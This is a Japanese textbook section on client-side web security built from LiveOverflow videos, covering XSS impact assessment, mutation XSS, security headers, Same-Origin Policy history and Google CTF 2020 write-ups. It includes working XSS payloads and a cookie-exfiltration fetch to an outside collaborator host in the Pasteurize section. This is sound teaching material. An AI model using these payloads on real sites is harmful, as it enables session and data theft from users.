# LiveOverflowの名作動画で学ぶXSSの実務判断とDOM Clobbering総合演習

> **この節で分かること**
> - XSSのPoCで `alert(1)` ではなく `alert(document.domain)` を使うべき理由と、サンドボックスドメイン／サンドボックス化iframeの見分け方を説明できる
> - mutation XSS（mXSS）がなぜ起きるのか、`<template>` を使ったクライアントサイドサニタイズの原理を説明できる
> - 「HTTPセキュリティヘッダが無い＝脆弱性」という短絡がなぜ間違いか、実務での深刻度判断ができる
> - Same-Origin Policy（同一オリジンポリシー）が1995〜96年にどう生まれたかを歴史から理解できる
> - DOM Clobbering・`window.name`永続性・prototype上書き・JSONP script gadget・`srcdoc` CSPバイパス・括弧なしXSSといったクライアントサイド技法を、実際のCTF攻略を通じて俯瞰できる

**元資料**: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w （原典は取得できず二次情報ベース。ただしチャンネル所有者本人が公開する `LiveOverflow/yt_statistics` の逐語トランスクリプトを一次データとして使用）
**関連する節**: 51a「LiveOverflow と PwnFunction チャンネルの歩き方」（同じノートの前半。チャンネルの性格・シリーズ構成・PwnFunctionのXSSゲームはそちらを参照）

---

## 0. この節の立ち位置

この節は、LiveOverflow（独 Fabian Fäßler 氏が運営する技術系YouTubeチャンネル。チャンネルID `UClcE-kVhqyiHCcjYwcpfj9w`）の代表的な動画6本を、**バグバウンティ実務で使える知識**として深掘りする。

前半（51a）でチャンネルの全体像とシリーズ構成を扱っているので、ここでは「1本ずつの中身」に集中する。取り上げるのは次の6本である。

| # | 動画タイトル | video_id | 学べる中心テーマ |
| --- | --- | --- | --- |
| 8 | DO NOT USE alert(1) for XSS | `KHwVjzWei1c` | XSSのPoCと影響評価 |
| 9 | XSS on Google Search - Sanitizing HTML in The Client? | `lG7U3fuNw3A` | mutation XSS とクライアントサイドサニタイズ |
| 10 | Missing HTTP Security Headers - Bug Bounty Tips | `064yDG7Rz80` | セキュリティヘッダの深刻度判断 |
| 11 | The Same Origin Policy - Hacker History | `bSJm8-zJTzQ` | SOPの歴史 |
| 12 | XSS a Paste Service - Pasteurize (Google CTF 2020) | `Tw7ucd2lKBk` | 型混同によるXSS |
| 13 | All The Little Things 1/2・2/2 (Google CTF 2020) | `dZXaQKEE3A8` / `UGtrpXk6QVU` | DOM Clobbering総合演習 |

各動画のURLは `https://www.youtube.com/watch?v=<video_id>` の形で開ける。以下の記述は、本人が `LiveOverflow/yt_statistics` リポジトリで公開している字幕本文（逐語トランスクリプト）に基づく。

> ### 📌 ここは自分で開いて読んでください
> **資料**: LiveOverflow YouTubeチャンネル — https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限＝プロキシで `www.youtube.com` への接続が拒否された）。以下の記述は、チャンネル所有者本人がGitHubで公開する逐語トランスクリプト（字幕本文）にもとづく要約である。動画の画面録画で示されるコード・DOMツリー・デベロッパーツールの画面は文字になっていないため、細部は動画そのものを見る必要がある。
> **読みどころ**:
> 1. 本節で扱う6本を、上の表のvideo_idで検索して視聴する。特に画面操作（開発者ツールでのオリジン確認、コールスタックのたどり方）は映像でしか分からない。
> 2. `DO NOT USE alert(1) for XSS`（`KHwVjzWei1c`）は最初に見るべき1本。「何が脆弱性で、何が脆弱性でないか」の実務感覚が身につく。
> **代替手段**: `git clone https://github.com/LiveOverflow/yt_statistics` で全336本の字幕本文（`liveoverflow_transcripts/<video_id>.txt`）を無料で読める。所有者がREADMEで利用を許諾している（"Feel free to use the data to create some statistics"）。ただしデータは2023-03-15時点。

---

## 1. `alert(1)` を使うな — XSSのPoCと影響評価

出典: 動画 `KHwVjzWei1c`（2021-07-31、140,268再生。ブログ版 `https://liveoverflow.com/do-not-use-alert-1-in-xss/`）。バグバウンティ実務で最も誤解が多い論点を扱う回である。

### 1-1. なぜそもそも `alert()` を使うのか

XSS（Cross-Site Scripting、クロスサイトスクリプティング）とは、攻撃者が用意したJavaScriptを他人のブラウザで実行させる脆弱性のこと。その存在を証明する定番のコードが `alert()` である。理由は2つある。

1. **視覚的だから**。入力欄にペイロードをばら撒いて巡回していれば、発火したときにポップアップで気づける。動画の言い回しでは "spray the input around, and pray that an alert pops"（入力にばら撒いて、アラートが出るのを祈る）。
2. **`alert` は `window` オブジェクトのメンバだから**。ブラウザのグローバルオブジェクト `window` には、`localStorage`（セッショントークンが入りうる）や `document.cookie` といった攻撃者が欲しがるデータがぶら下がっている。`alert` を呼べたということは、制限付きのJSテンプレート（後述のAngularJSサンドボックス等）の**外に出られた**指標になりうる。

ただし補足として、近年は制限付きJSテンプレートを破る研究はほぼ諦められている。逐語では "nowadays we mostly have given up on these restricted javascript templates, as it was a cat-and-mouse game with fixes and bypasses, and we learned it's too hard."（修正と回避のいたちごっこで、難しすぎると学んだ）。

### 1-2. なぜ `alert(1)` ではダメなのか — サンドボックスドメイン

動画は Google Blogger を例に実演する。

- Bloggerにはユーザが任意のHTMLをブログに入れられる機能がある。`<script>alert(1)</script>` を入れてプレビューすると、実際にアラートが出る。`blogger.com` はバウンティ対象なので「クリティカルXSS発見！」と思ってしまう。
- ところが `alert(document.domain)` に変えると、表示されるのは **`usersubdomain.blogspot.com`**。開発者ツールで見ると、`blogger.com` は `blogspot.com` を **iframe（インラインフレーム。ページ内に別ページを埋め込む要素）で埋め込んでいる**だけ。XSSは `blogspot.com` 側で発火している。

Googleの設計意図（逐語）: "Google uses a range of sandbox domains to safely host user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML and JavaScript and make sure that they can't access any user data."（ユーザ生成コンテンツを安全にホストするためのサンドボックスドメイン群を使い、ユーザデータにアクセスできないようにしている）。

サンドボックスドメインとは、ユーザがアップロードしたHTML/JSを本体と別のドメインで動かすための隔離用ドメインのこと。SOP（同一オリジンポリシー。あるオリジンのJSが別オリジンのデータを読むのを禁じるブラウザの基本規則）により、`usersubdomain.blogspot.com` のJSは `blogger.com` のCookieを読めない。**よって、これは脆弱性ではない**。意図された設計である。

### 1-3. サンドボックス化iframe（`sandbox` 属性）

ドメイン分離とは別に、`<iframe sandbox>` 属性による分離もある。`sandbox` 属性は、埋め込んだ内容の権限を明示的に制限するHTMLの仕組みである。動画では `eval`（文字列をJSとして実行する関数）を実行できる小ツールを2つ用意して比較する。

| ツール | `alert(document.session)` の結果 | 評価 |
| --- | --- | --- |
| 通常のiframe | セッショントークンを盗める | **本物の脆弱性** |
| sandboxed iframe内 | `alert()` は動くが秘密トークンは読めない。`alert(window.origin)` を撃つと origin が空 | 脆弱性ではない |

サンドボックス化iframeは「奇妙なorigin（空のorigin）」を持ち、埋め込み元から隔離されている。したがって**サンドボックス化iframe内のalertも有効なバウンティ対象ではない**。

### 1-4. `alert` が出ないケース — `console.log` を使え

`sites.google.com` では生HTMLを埋め込めるが、XSSを仕込んでも何も起きない。開発者ツールを見ると「sandboxed iframe のため alert がブロックされた」（`allow-modals` が無効）とある。`allow-modals` は、サンドボックス化iframe内でダイアログ（`alert` など）を許可するトークンである。

この場合は **`console.log()` を使う**。ただしコンソール出力は見落としやすいので、フィルタを使うこと。そして `document.domain` を出すと **`googleusercontent.com`**。やはりサンドボックスドメインであり、脆弱性ではない。

### 1-5. 無効なXSSを見つけたら捨てるのか — チェーンの部品になる

サンドボックス内で発火したXSSは、それ単体では報告できない。だが**捨てる必要はない**。

- JSONPのサンドボックス化iframeは、親サイトと `postMessage`（ウィンドウ間でメッセージをやり取りするブラウザAPI）で通信していることが多い。そのメッセージ処理を悪用して**サンドボックス脱出**できれば、本物のオリジン上でのJS実行になる。
- 重要な区別（逐語）: "the vulnerability is NOT this first XSS, the vulnerability is the ESCAPE out of it."（脆弱性は最初のXSSではなく、そこからの脱出のほうだ）。

実務指針は、無効なXSSでも**どこで見つけたかメモを残す**こと。単体では報告しない。

### 1-6. この動画から抽出する3つの原則

1. XSSのPoCは**必ず `alert(document.domain)` か `alert(window.origin)`**（アラートが封じられていれば `console.log`）を使う。
2. アラートが出た＝脆弱性、ではない。**どのオリジンで実行されたかが全て**。
3. サンドボックスドメイン／サンドボックス化iframeは**防御として優秀**であり、そこでのXSSは意図された設計である。

---

## 2. Google Search XSS — mutation XSSとクライアントサイドサニタイズ

出典: 動画 `lG7U3fuNw3A`（2019-03-31、675,872再生＝チャンネル屈指の再生数）。発見者は Masato Kinugawa 氏（Cure53）。本章で最も重要な1本である。

### 2-1. なぜサニタイズを「サーバ」ではなく「ブラウザ」でやるのか

サニタイズとは、危険な入力を無害化する処理のこと。通常のXSS対策は「出力コンテキストに応じた適切なエンコード」であり、モダンなフレームワークを使えばほぼ解決する。

しかし**「一部のHTMLタグは許可したい」**ケース（HTMLメールのレンダリング、WYSIWYGエディタ＝見たまま編集できるエディタ）は別問題である。LiveOverflowの主張は直感に反するが正しい。**この用途ではXSS防止をJavaScript側＝ブラウザ側に移すべき**だという。

- 理由: HTMLのパース（解析）は**ブラウザごと・バージョンごとに挙動が違う**。サーバ側ライブラリで全ブラウザ・全バージョンの挙動を再現するのは "Probably impossible to maintain."（おそらく維持不可能）。
- 解決策: **ブラウザ自身のパーサを使ってHTMLをパースし、その結果のDOM（Document Object Model。HTMLをツリー構造として表したもの）を検査して危険な要素を削る**。

### 2-2. HTMLパーサの非直感的な挙動

動画は演習問題を出す。次の2つのスニペットがどうパースされるか自分で考えよ、という課題である。

```html
<div><script title="</div>">
```

これは `div` の中に `script` があり、`</div>` は **`title` 属性の文字列の一部**として扱われる。ブラウザが閉じタグを補完する。

```html
<script><div title="</script>">
```

こちらは `script` が `head` に置かれ、**`<div title="` までがJavaScriptソースとして扱われ**、`</script>` でスクリプトが終わる。残りの `">` は body のテキストになる。

理由（逐語）: "the browser expects javascript inside of the tag. Thus it switches the parser from an HTML parser to a javascript parser."（タグの内側にはJavaScriptが来ると期待するので、パーサをHTMLパーサからJavaScriptパーサに切り替える）。

**この「同じ形なのに文脈で解釈が変わる」性質が mutation XSS の土台**である。mutation XSS（mXSS、変異型XSS）とは、一度サニタイズされた安全なHTML文字列が、DOMに挿入される過程でブラウザによって別の形に「変異」し、危険なタグが復活してしまうXSSのこと。仕様に書かれた挙動もあれば、特定ブラウザ固有の挙動もある。

### 2-3. DOMPurify の仕組み（`<template>` の利用）

DOMPurify は、HTMLサニタイズの定番ライブラリである（メンテナは Mario Heiderich 氏／Cure53。Masato Kinugawa 氏も同社）。`purify.js` 内で **`template` 要素**を生成して使う。

- `div.innerHTML = '<img src=x onerror=alert(1)>'` とすると、**即座に画像読み込みが走り alert が出る**。`innerHTML` は要素の中身をHTML文字列で設定するプロパティで、`onerror` は画像読み込み失敗時に発火するイベントハンドラである。
- 一方 `template.innerHTML = '<img src=x onerror=alert(1)>'` では、**何も起きない**。しかし `template.content` の子要素として `img` を取得でき、DOM操作で `onerror` 属性を削除できる。

`<template>` 要素は「テンプレート＝雛形」を保持するためのHTML要素で、その中身は**不活性（inert）**として扱われる。つまり画像は読み込まれず、スクリプトも動かない。消毒後に `innerHTML` で安全なHTML文字列を取り出し、本物のドキュメントに入れる。**これがクライアントサイドサニタイズの基本形**である。

### 2-4. Masatoの発見 — `<noscript>` のパース差異

Masato 氏のペイロードは `noscript` 要素を使う。`<noscript>` は、JavaScriptが無効なブラウザ向けの代替内容を書く要素である。

- `template.innerHTML` に入れると、DOMツリーは `noscript` の中に `p`、その `p` の `title` 属性の文字列として `</noscript><img …>` が入る（＝**属性値なので無害に見える**）。サニタイザは「危険な要素はない、安全だ」と判定する。
- ところが**同じ文字列を `div.innerHTML` に入れると、画像リクエストが飛び `alert(1)` が発火する**。DOMを見ると `noscript` が開き、テキストが続き、`</noscript>` で閉じられ、**`img` が本物のHTMLタグになっている**。

原因はHTML仕様そのものにある（逐語）:

> "The noscript element represents nothing if scripting (so javascript) is enabled, and represents its children if javascript is disabled. It is used to present different markup to user agents (so browsers) that support scripting and those that don't support scripting, by affecting how the document is parsed."

決定打はこうだ。**ブラウザ本体ではJSが有効だが、`template` 要素の中ではJSが「無効」扱いになる**。よって `template` 内と本文中で `noscript` のパース結果が食い違う。これが **parser differential（パーサ差異）**である。サニタイズした環境と実際に挿入する環境でパーサの状態が違うことが、mXSSを生む。

### 2-5. Google Searchでの実際の経路と修正

デバッグ手法として、教科書に載せる価値のあるTipsがある。ペイロードに **`debugger;` 文**を仕込むと、XSS発火時にJSデバッガでブレークする。そこからコールスタック（関数の呼び出し履歴）を遡って「どこでどうして発火したか」を突き止められる（逐語: "this is a good tip when trying to debug a more complex DOM XSS to see where and why it fired"）。

- コールスタックを1階層上がると、文字列が `a.innerHTML` に代入されている箇所に到達。Google側も `template` 要素を使う独自サニタイザを持っていた。
- 修正はGoogleによって極めて速やかに行われた。LiveOverflowは古い脆弱なJSと新しいJSを保存してdiff（差分比較）し、`innerHTML` が**追加のXMLサニタイザ呼び出しに置き換えられている**ことを確認した。
- 根本原因はGoogleのオープンソースJSライブラリ **closure-library** にあった。修正コミット `https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa` は、**2018年9月26日の変更のロールバック**だった。その変更は（インタフェース設計上の都合で）**追加のサニタイズ段を削除**してしまっていた。
- 結果（逐語）: "the XSS existed for roughly 5 months in THE google javascript library, and likely affected many many google products that relied on that sanitizer."（このXSSはGoogleのJSライブラリに約5か月存在し、そのサニタイザに依存する多くのGoogle製品に影響した可能性が高い）。

### 2-6. この動画から抽出する結論

1. HTMLサニタイズは**ブラウザのパーサを使え**（`<template>`）。自前の正規表現やサーバ側パーサでやってはいけない。
2. それでも**パーサ差異（parser differential）が残る**。`<noscript>`、`<math>`/`<svg>` の foreign content、`<template>` 内のスクリプト無効化などが差異の源になる。
3. 「サニタイズした文字列」と「実際に挿入する文脈」で、パーサの状態が同一であることを保証しなければならない。
4. ライブラリの**サニタイズ段を「使いにくいから」と外す変更**が、5か月間の全社的XSSを生んだ。セキュリティ機構の削除はコードレビューの最重要監視対象である。

---

## 3. HTTPセキュリティヘッダ欠如は脆弱性か

出典: 動画 `064yDG7Rz80`（2022-03-16、115,843再生）。**Google VRP（bughunters.google.com）からの委託制作**であることを動画冒頭で明示している。VRP とは Vulnerability Reward Program（脆弱性報奨金プログラム）の略である。

この動画は「セキュリティヘッダが無い＝脆弱性」と短絡する報告が多すぎる現状に、**バランスを取る**ための教材だ。バグバウンティの「有効/無効」判断を学ぶ最良の素材である。

> 動画冒頭の姿勢（逐語）: "there is basically no content that tries to balance the sides a bit and so in this video I try to be like 'calm down. Chill. The world is not gonna end' if a site didn't use certain security headers."
> 利益相反の明示（逐語）: "Google paid for this video but not to be shown on here. […] This video was produced for google, to be embedded on their site."

レスポンスヘッダは2分類される。**付けるとセキュリティを「弱める」もの**と、**付けると「強める」もの**である。

### 3-1. `X-Frame-Options`（クリックジャッキング対策）

`X-Frame-Options` は、他サイトが `<iframe>` で自サイトを埋め込むのを防ぐヘッダである（`SAMEORIGIN` / `DENY`）。クリックジャッキングとは、透明にした被害サイトを攻撃サイトに重ね、ユーザに気づかせずクリックさせる攻撃のこと。

- しかし**クリックジャッキングで実害が出る機能がそもそも無いサイトでは、ヘッダが無くても安全**である。
- 逆のケース: **YouTubeは埋め込まれたい**（SHAREの埋め込みHTML）。だから絶対に `X-Frame-Options` を付けない。それは仕様であって欠陥ではない。
- 判断基準は「重大な機能 + クリックジャッキング」＝脆弱性、「退屈で低リスクな機能 + クリックジャッキング」＝ほぼ無意味。
- 逐語: "you shouldn't blindly follow best-practice guides, or scanners that tell you that the header is missing. You need to understand if there is actual impact."

### 3-2. `Content-Security-Policy`（CSP）

CSP（コンテンツセキュリティポリシー）は、ページが読み込めるスクリプトの出所などを制限するヘッダである。

- 理論上ほぼ全てのXSSを防げるうえ、`frame-ancestors: none` で `X-Frame-Options` 相当も担える。
- 実演: Googleのbughunterサイト自体に**CSPが無い**。Google製の **CSP Evaluator** に空ポリシーを入れると `script-src [missing]` が **High severity** として報告される。
- しかしLiveOverflowの判断は、CSPは**防御（defense in depth＝多層防御）であって修正ではない**というものだ。XSSが存在するときに悪用を阻止するものに過ぎない。
- 逐語: "If there is an XSS CSP doesn't fix it, it could just block exploitation. it's a defense in depth strategy. […] missing CSP in itself is not really a vulnerability."

### 3-3. `Strict-Transport-Security`（HSTS）

HSTS（HTTP Strict Transport Security）は、ユーザが `http://` で来ても以後HTTPSに強制するヘッダで、中間者攻撃を緩和する。

しかし仕様上の限界がある（逐語）:

> "The Strict-Transport-Security header is ignored by the browser when your site is accessed using HTTP; this is because an attacker may intercept HTTP connections and inject the header or remove it. [ONLY] When your site is accessed over HTTPS with no certificate errors, the browser knows your site is HTTPS capable and will honor the Strict-Transport-Security header."

つまり**「一度安全に読み込まれたあとにしか効かない」**（TOFU問題＝Trust On First Use、最初のアクセスを信用するしかない問題）。しかもモダンブラウザはHSTSが無くても同等の挙動をする。実演では、`liveoverflow.com` に `http://` でアクセスすると1回目はリダイレクト、2回目以降は**HTTPリクエスト自体が出ない**。

価値があるのは **HSTS preload リスト**（Googleのプロジェクト。ブラウザに最初からHTTPS強制を焼き込むリスト）との併用である。Google自身の見解（逐語）: "Internally, we are already well aware of our HSTS posture and are actively working on adding HSTS support to additional endpoints" ＝**既知の課題であり、報告する価値がない**。

### 3-4. CORS設定ミス（「弱める」側のヘッダ）

**最も重要な判別基準がここにある**。CORS（Cross-Origin Resource Sharing、オリジン間リソース共有）は、SOPを部分的に緩めて別オリジンからのアクセスを許す仕組みである。同じ「全オリジン許可」でも、認証方式によって深刻度がまるで違う。

| サイトの認証方式 | 寛容なCORS設定の影響 |
| --- | --- |
| **Cookieセッション認証** + `Access-Control-Allow-Credentials: true` | **重大**。ブラウザがセッションCookieを付けて送り、**しかもレスポンスを読める**。影響はCSRF/XSS相当（認証済みリクエスト＋レスポンス読み取り） |
| **トークン認証**（コードが `Authorization` ヘッダを付ける） | **問題なし**。セッションCookieが無く、ブラウザは `Authorization` ヘッダを自動付与しない。認証されないのでCSRF類似の攻撃は成立しない |

さらに、Googleの多くのサイトは**意図的にCORSを開いている**（公開APIとして他オリジンからのアクセスを想定）。**「オープンなCORS＝設定ミス」と機械的に報告してはいけない**。

### 3-5. Cookie の `HttpOnly` フラグ

`HttpOnly` は、JSからCookieを読めなくするフラグで、XSSによるCookie窃取を防ぐ。

- しかし "it's rather ineffective."（かなり効果が薄い）。XSSがあるなら、攻撃者はCookieを盗まなくても**そのページから認証済みリクエストを直接投げればよい**からだ。
- また、そもそも全てのCookieが認証用とは限らない。UIの設定値などを入れたCookieに `HttpOnly` や `Secure` が無くても実害はない。

### 3-6. この動画の結論

> "There is a reason these security headers exist. They do really good things and can protect an application from exploiting other vulnerabilities. But them missing, doesn't necessarily create a vulnerability. […] You cannot blindly copy & paste the result of a scanner reporting that headers are missing. […] When it comes to bug bounty, always think about the realistic impact."

ヘッダ欠如をスキャナ任せに報告するのではなく、**現実的な影響（realistic impact）を常に考える**。これがバグバウンティの基本姿勢である。

---

## 4. Same-Origin Policyの誕生 — ハッカー史

出典: 動画 `bSJm8-zJTzQ`（2022-07-23、89,228再生）。Windows 95 + 実物のNetscapeを起動して実演する回である。SOPは現代クライアントサイドセキュリティの土台なので、その「なぜ」を歴史から理解しておく価値は大きい。

### 4-1. 前史（1990年代前半）

初期のWebの構成要素は**Webサーバとブラウザの2つだけ**だった。URL（当時はLocationと呼んだ）を与えるとHTTPリクエストが飛び、HYPERTEXT（HTML）が返り、ブラウザがレンダリングする。真の力は **`<a>` タグによるリソース間リンク**にあった。1994〜95年にAmazonが登場し、オンラインバンキング・ショップ・Webメールが現れ、HTMLに `FORM` が加わる。

### 4-2. Cookieの発明（1994年6月、Netscape）

Cookieとは、サーバがブラウザに保存させる小さなデータで、ログイン状態の維持などに使う。当時の説明（逐語）:

> "As you browse the web, any cookies which servers might send to your copy of Netscape are stored in your computer's memory. When you quit out of Netscape, any cookies that haven't expired are written to a cookie file so they can be reloaded next time you run Netscape."
> "Netscape Navigator does not send any cookies to any web server they're not for."

（出典URL: `https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html`）

### 4-3. LiveScript → JavaScript（1995年、Netscape 2.0）

JavaScriptは最初 LiveScript という名前だった。Netscape 2.0 beta 1 のリリースノート（逐語）: "LiveScript is currently implemented only on Windows. Other platforms will be supported in Beta 2." beta 2 で改称された（逐語）: "Built-in JavaScript: […] Netscape Navigator now includes a built-in scripting language, called JavaScript. […] JavaScript is embedded in HTML documents with a SCRIPT tag, and there is no compilation needed to run the script."

### 4-4. 最初の攻撃 — framesによる情報窃取（1995年9月）

当時のWebは **`frameset` / `frame`**（今日の `iframe` の先祖）を多用していた。フレームはウィンドウUIの一部として統合され、JSからフレーム階層にアクセスできた。

LiveOverflowの実演は、**異なるドメインの2つのフレーム**（片方はログインページ、片方は攻撃者ページ）を持つ frameset を作る。攻撃者ページのJS `stealPassword()` は次を行う。

```text
1. top フレームに上がる
2. 2番目のフレームの window にアクセスする
3. その document に入る
4. 最初の form からユーザ名・パスワードの value を読む
5. document.cookie も読む
```

**クロスドメインなのに全部読める**。評価（逐語）: "Just visit a malicious website, and using frames it could load for example your banking website, and steal your cookies, passwords or even perform transactions." / "From today's perspective, this is absolutely insane." 擁護もある（逐語）: "Keep in mind at this time, something like cross-site scripting didn't exist yet. They just invented javascript."（この時点でXSSのような概念はまだ存在せず、JavaScriptを発明したばかりだった）。

### 4-5. 修正 — Netscape 2.02 でSOPが発明される

2.02で同じ攻撃を試すと `Forms cannot be indexed as an array` エラーが出て、Cookieアクセスも失敗する。ところが**2.02のリリースノートに書かれている「修正理由」はフレーム間の話ではない**（逐語）:

> "Due to an implementation problem in Netscape Navigator 2.0, a privacy concern existed because it was possible for a server script to access the listing of local file names and directories on the user's machine. [...] Navigator 2.02 fixes this problem by refusing to allow a script from a server to view file names and directory listings from the local user's machine."

LiveOverflowの推測はこうだ。当時のブラウザは**ローカルファイルシステムも閲覧できた**ので、`C:` ドライブをフレームに読み込んで `<a>` タグを全部拾えば**ローカルのファイル名一覧が盗める**。**これがおそらく史上初のJavaScript関連脆弱性**であり、Netscapeが真に問題視したのはそちらだった。

SOPという概念として明文化されるのは **Netscape 3 のリリースノート**である（逐語）:

> "Navigator version 2.02 and later automatically prevents scripts on one server from accessing properties of documents on a different server."

そして逐語: "So here Netscape just invented the same origin policy."（こうしてNetscapeはSame-Origin Policyを発明した）。

### 4-6. 当時の相対的な扱い

1995〜96年当時、SOPの重要性は自明ではなかった。**もっと強力な脆弱性が山ほどあった**からだ。

- LiveOverflowの実演スクリプトだけでNetscapeが **segfault**（use-after-free と推測。解放済みメモリを使う不具合）を起こす。
- Java Applet による**直接の任意コード実行**もあった。1996年のBugtraq投稿（逐語）: "Using this bug, an attacker can bypass all of Java's security restrictions. This includes executing native code on the client, with the same permissions as the user of the browser. No preconditions are necessary other than viewing the attacker's web page, and the process can be made completely invisible to the victim."

結論（逐語）: "all the work done around this time would influence web security up until today." 本人のリサーチ姿勢（逐語）: "I'm not just presenting an article or a wikipedia page. I spend a lot of time reading mailing lists and web archives and trying to connect the dots." — 動画では **Internet Archive への寄付**を視聴者に呼びかけている。

---

## 5. Pasteurize — 型混同によるXSS（Google CTF 2020）

出典: 動画 `Tw7ucd2lKBk`（2020-09-09、59,931再生）。260チームが解いた "easy" 問題である。CTF（Capture The Flag）とは、意図的に脆弱性を仕込んだ課題を攻略して隠しフラグを奪う競技のこと。

### 5-1. 構造の把握（クライアントサイド課題の定型）

- ペーストを作成すると、**サーバが返す生HTML中ではノート要素は空**で、下方のJSに文字列として内容が埋め込まれている。それが `DOMPurify.sanitize()` を通って `innerHTML` に入る。
- LiveOverflowの実務感覚: DOMPurifyは「HTMLを一部許可しつつXSSを防ぐ」用途で入手できる最良のライブラリであり、バイパスは稀で奇妙なエッジケースのみ。**よってここを破るのがゴールではない**と即断した。
- 決め手のヒント: ソース中のコメント「fix the bug number 1337, in /source, that could lead to XSS」。`/source` にNodeJSサーバのソースが公開されている。
- **「share with TJMike」ボタン**の存在＝XSS課題の定型（ボットに見せて攻撃する）。

### 5-2. サーバ側の（一見完璧な）エスケープ

ノート表示ルートは `escape_string()` を通す。その実装は **`JSON.stringify()` を使う巧妙な手法**である。文字列を渡せばJSON文字列としてエスケープされ、JavaScript文字列リテラルとして安全になる。さらにHTML文書に埋め込むので、`</script>` で壊されないよう**山括弧もエスケープ**している。**これは正しい実装**だ。

### 5-3. 実際の脆弱性 — `body-parser` の `extended: true`（型混同）

- チームメイトの loknop 氏が発見。着眼点は `bodyParser.urlencoded` の **`extended: true`** である。
- `body-parser` のドキュメントによれば、extended構文は rich object（入れ子オブジェクト）を許す。"For more information, please see the qs library."
- `qs` のドキュメント（逐語）: "qs allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets []"

つまりPOST bodyで `content[key]=value` と書くと、**サーバが文字列だと思っている `content` が「オブジェクト」になる**。`JSON.stringify()` に**オブジェクト**を渡すと、出力は `{"key":"value"}` のように**ダブルクォートを含む**。これがJS文字列リテラルの中に置かれると**クォートを閉じて外に出られる**。

成功ペイロードの形は次のようになる。

```text
content[-alert()-]=-1-
```

素直に `content[key]=value` にすると、生成されるJSが `"" {"key":"value"} ""` のような構文エラー（`Unexpected identifier`）になってしまう。そこで**キーと値をマイナス演算子で数式に仕立てる**ことで、構文的に妥当なJSにする。`alert()` は減算の評価のために**実行される**。動画の逐語表現では "Content, and in brackets we have dash, alert, dash, equal, dash, one, dash." と説明される。

**教訓**: サーバ側のエスケープが正しくても、**エスケープ関数に渡る値の「型」が想定外**（文字列のつもりがオブジェクト）なら破綻する。Express/`qs` の `extended: true` は**型混同（HTTP Parameter Pollution の親戚）の典型的な発生源**である。実務手順としては、**Burp Repeater で `content[...]` の形に書き換えて送る**（Burp Community Edition の埋め込みChromeブラウザ機能を推奨）。

### 5-4. 「フラグはどこか」探索の試行錯誤（失敗過程も教材）

課題説明文 "third parties might have implanted it" に引きずられ、LiveOverflowは次を順に試して全部外した。

| 試したこと | 結果 |
| --- | --- |
| TJMikeが見ているHTML全体を `fetch` で外部送信して調査 | 何も無し |
| "implanted" ＝ Service Worker が仕込まれている？ 登録済みを列挙 | 無し |
| "implanted" ＝ iframe埋め込み？ `top` のURLを調べる | 無し |
| "PASTE"urize ＝ コピペ？ `navigator.clipboard.readText()` でクリップボードを盗む | 無し |
| Service Workerを自分で仕込んでMITM | 同一ドメインのクリーンな `.js` が必要で不可 |
| TJ**Mike**（🎤）＝ マイク録音？ | 実装が面倒でやらず |

**正解は最も基本的な `document.cookie`** だった。サイト自体はCookieを使っていないため、誰も思いつかなかったのである。最終ペイロードは `fetch('https://<collaborator>/?c=' + document.cookie)` 相当で、Burp Collaborator（外部からの通信を受信する診断サーバ）で受信する。104.x のGoogleサーバIPからのリクエストに、フラグが入ったCookieが含まれていた。反省（逐語）: "in the end I wish they had hinted more at the cookie."

---

## 6. All The Little Things — DOM Clobbering総合演習（Google CTF 2020）

出典: 動画 `dZXaQKEE3A8`（Part 1/2, 2020-09-28）と `UGtrpXk6QVU`（Part 2/2, 2020-10-08）。**最終的に20チームのみ正解、ALLES!は終了2時間前に20番目＝最後の正解チーム**。作者は terjanq 氏。本ノート内で**クライアントサイド技法が最も高密度に登場する教材**である。

### 6-1. 前提と構造

- 出題文: "I left a little secret in a note, but it's private, private is safe." / "Note: TJMike🎤 from Pasteurize is also logged into the page." → **Pasteurize（5節）のXSSが攻撃の起点**であることを示唆する。
- サイト機能: ユーザ名＋プロフィール画像URLでログイン、設定（名前・画像・テーマ dark/light）、ノート作成（public/private）。**publicノートはPasteurizeドメインに、privateノートはlittlethingsドメインに表示される**。
- privateノートも DOMPurify を通る（`onerror` は除去される）。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PwnFunction「Solving a Hard Google CTF challenge - "Paste-tastic!"」 — https://www.youtube.com/watch?v=2up8J9dErHI （`?t=797` ＝13:17以降）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限。PwnFunctionチャンネルはトランスクリプトが入手できず部分取得のまま）。以下のDOM Clobbering記述はLiveOverflow側のトランスクリプトにもとづく。
> **読みどころ**:
> 1. DOM Clobberingの定番入門動画。本節のAll The Little Thingsを読む前の前提知識として最適。特に13:17以降を集中して見る。
> 2. アニメーションで `id`/`name` 属性が `window`/`document` を汚染する様子が視覚的に分かる。
> **代替手段**: PwnFunctionの解説はアニメーション主体のため字幕だけでは補えない。無料でYouTube上で公開されているので直接視聴するのが最善。

### 6-2. 攻撃面の棚卸し（`theme.js` / `user.js` / `utils.js`）

- `utils.js`: DOMロード時に `/me` へ `fetch` → JSONを `make_user_object()` に渡す。
- `user.js`: `user` クラス生成。プロフィール画像を設定し、`update_theme()` を呼ぶ。さらに **`load_debug?.()`** という呼び出しがある（`?.` は「未定義なら何もしない」オプショナル呼び出し）。
- `theme.js`: `update_theme()` は `document.username` オブジェクトからテーマを取り、**`script` タグを生成して `cb`（callback）パラメータ付きのURLを埋め込む**。そのエンドポイントは **JSONP API** であり、レスポンスは `callback` パラメータの文字列を**関数名として呼ぶ**だけのJSである。JSONP（JSON with Padding）とは、SOPを回避して別オリジンからデータを取るための古い手法で、`callback(データ)` という形のスクリプトを返す。**`callback` は比較的自由に選べる**ため、littlethingsドメイン上にホストされた「任意の関数を1回呼ぶだけのスクリプト」を作れる ＝ **Script Gadget（スクリプトガジェット。既存のコード片を悪用してJS実行に繋げる部品）**である。

### 6-3. DOM Clobberingの基礎

DOM Clobbering（DOMクロバリング）とは、`id` や `name` 属性を持つHTML要素を注入すると、その要素が同名のグローバル変数（`window.○○`）として参照できてしまう挙動を悪用する技法である。スクリプトを注入できなくても、HTMLタグさえ通れば攻撃に使える。

